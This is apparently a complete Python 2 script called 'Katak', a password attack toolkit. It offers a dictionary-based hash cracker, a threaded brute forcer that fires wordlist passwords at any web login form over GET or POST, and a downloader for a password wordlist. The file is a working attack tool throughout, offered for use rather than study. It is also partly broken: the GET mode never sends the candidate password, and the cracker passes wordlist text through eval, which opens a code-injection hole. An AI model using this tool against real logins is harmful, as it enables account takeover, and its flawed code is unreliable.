#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import sys
import time
import hashlib
import requests
import threading
import progressbar

class hash_kill:
	class TypeError(Exception):
		def __init__(self):
			Exception.__init__(self, "Its not supported algorithms!")
	def __init__(self, hash):
		self.hash = hash
		self.type = self.detect()
		if self.type in "md5 sha1 sha224 sha256 sha384 sha512":self.kill()
		else:print "[!] Something went error..."
	def detect(self):
		if len(self.hash) == 32:return "md5"
		elif len(self.hash) == 40:return "sha1"
		elif len(self.hash) == 56:return "sha224"
		elif len(self.hash) == 64:return "sha256"
		elif len(self.hash) == 96:return "sha384"
		elif len(self.hash) == 128:return "sha512"
		else:raise self.TypeError()
	def kill(self):
		print "[+] Hash type:",self.type
		wordlist_ = open("password.txt", 'r').readlines()
		progress = progressbar.ProgressBar()
		print "[+] Cracking..."
		for word in progress(wordlist_):
			if self.hash != eval('hashlib.{}("{}").hexdigest()'.format(self.type, word.strip())):pass
			else:print "\n[+] Password Found:",word;break;print "[!] Done.\n";time.sleep(1.5);main()
		print "\n[!] Done.\n"
		time.sleep(1.5)
		main()

class brute_force:
	def __init__(self, url, params, wordlist, match_word, method, thread=None, timeout=None):
		self.url = url
		self.params = params
		self.wordlist = wordlist
		self.match_word = match_word
		self.method = method
		if thread:
			self.thread = thread
			self.timeout = None
		else:
			self.thread = False
			if timeout:self.timeout = timeout
			else:self.timeout = 1
		self.bruteForce()
	def withThread(self):
		def post(self):
			for word in open(self.wordlist).read().split("\n"):
				params = {}
				sys.stdout.write(u"\u001b[1000D[*] Trying pass {}".format(word))
				sys.stdout.flush()
				params.update({self.params.split("&")[0].split("=")[0]:self.params.split("&")[0].split("=")[1],self.params.split("&")[1].replace("=",""):word})
				response = requests.post(self.url, data=params).text
				if self.match_word not in response:pass
				else:print "\n[+] You have successfully logged in.";print "[+] Matched word: {}".format(self.match_word);break
			print "[!] Done.\n"
		def get(self):
			for word in open(self.wordlist).read().split("\n"):
				sys.stdout.write(u"\u001b[1000D[*] Trying pass {}".format(word))
				sys.stdout.flush()
				response = requests.get(self.url+"?"+self.params).text
				if self.match_word not in response:pass
				else:print "\n[+] You have successfully logged in.";print "[+] Match word: {}".format(self.match_word);break
			print "[!] Done.\n"
		if self.method == "get":
			t = threading.Thread(target=get, args=(self,))
		elif self.method == "post":
			t = threading.Thread(target=post, args=(self,))
		else:
			t = threading.Thread(target=get, args=(self,))
		t.start()
	def withNoThread(self):
		def post(self):
			for word in open(self.wordlist).read().split("\n"):
				params = {}
				sys.stdout.write(u"\u001b[1000D[*] Trying pass {}".format(word))
				sys.stdout.flush()
				params.update({self.params.split("&")[0].split("=")[0]:self.params.split("&")[0].split("=")[1],self.params.split("&")[1].replace("=",""):word})
				response = requests.post(self.url, data=params).text
				if self.match_word not in response:pass
				else:print "\n[+] You have successfully logged in.";print "[+] Matched word: {}".format(self.match_word);break
				time.sleep(self.timeout)
			print "[!] Done.\n"
		def get(self):
			for word in open(self.wordlist).read().split("\n"):
				sys.stdout.write(u"\u001b[1000D[*] Trying pass {}".format(word))
				sys.stdout.flush()
				response = requests.get(self.url+"?"+self.params).text
				if self.match_word not in response:pass
				else:print "\n[+] You have successfully logged in.";print "[+] Matched word: {}".format(self.match_word);break
				time.sleep(self.timeout)
			print "[!] Done.\n"
		if self.method == "get":get(self)
		elif self.method == "post":post(self)
		else:get(self)
	def bruteForce(self):
		if self.thread != False:self.withThread()
		else:self.withNoThread()

class download:
	class NetworkError(Exception):
		def __init__(self):
			Exception.__init__(self, "Network is unreachable!")
	def __init__(self, url):
		self.url = url
		self.wordlist()
	def wordlist(self):
		try:__wordlist__=requests.get(self.url).text;open("password.txt","w").write(__wordlist__);print "[+] Downloaded: password.txt\n[+] String loaded: {}".format(len(open("password.txt").read())) 
		except:raise self.NetworkError()

def main():
	opt = raw_input("[h]ash-killer [b]rute-force [w]ordlist [a]bout: ")
	if opt.lower() == "h":
		hash_kill(raw_input("[*] enter hash: "))
	elif opt.lower() == "b":
		url = raw_input("[*] enter url: ")
		params = raw_input("[*] enter params: ")
		wordlist = raw_input("[*] wordlist: ")
		match_word = raw_input("[*] match word: ")
		method = raw_input("[*] method: ")
		thread = raw_input("[*] thread (y/n): ")
		if thread.lower() == "y":thread=True
		elif thread.lower() == "n":thread=None
		else:thread=None
		if thread != True:
			timeout = raw_input("[*] timeout (default: 1s): ")
			if timeout != "":pass
			else:timeout=1
		else:
			timeout=None
		brute_force(url, params, wordlist, match_word, method, thread, timeout)
		main()
	elif opt.lower() == "w":
		opt = raw_input("[d]ownload [u]pdate [b]ack: ")
		if opt == "d":
			url = raw_input("[*] enter url: ")
			download(url)
			time.sleep(1.5)
			main()
		elif opt == "u":
			try:
				__wordlist__ = requests.get("https://raw.githubusercontent.com/Gameye98/Gameye98.github.io/master/wordlist/password.txt").text
				open("password.txt","w").write(__wordlist__)
				print "[+] Updated: password.txt"
				print "[+] String loaded: {}".format(len(open("password.txt").read()))
				time.sleep(1.5)
				main()
			except:print "[!] NetworkError: Network is unreachable";main()
		elif opt == "b":
			main()
	elif opt.lower() == "a":
		print __about__
		main()
	else:
		main()

__banner__ = """
Katak (v0.0.1-dev) by DedSecTL...
=================================
* Hash Killer 80%
* Hash Detection 75%
* Brute Force 90%
* Big Wordlist 100%
* Support Threading 100%
"""
__about__ = """
About
-----
Katak - Password Attack Toolkit
Author : DedSecTL <dtlily>
Version : 0.0.1
Team : BlackHole Security
Date : Sun Oct 28 21:08:48 2018
Telegram : @dtlily
Line : dtl.lily
"""

if __name__ == '__main__':
	try:
		print __banner__
		main()
	except KeyboardInterrupt:
		sys.exit()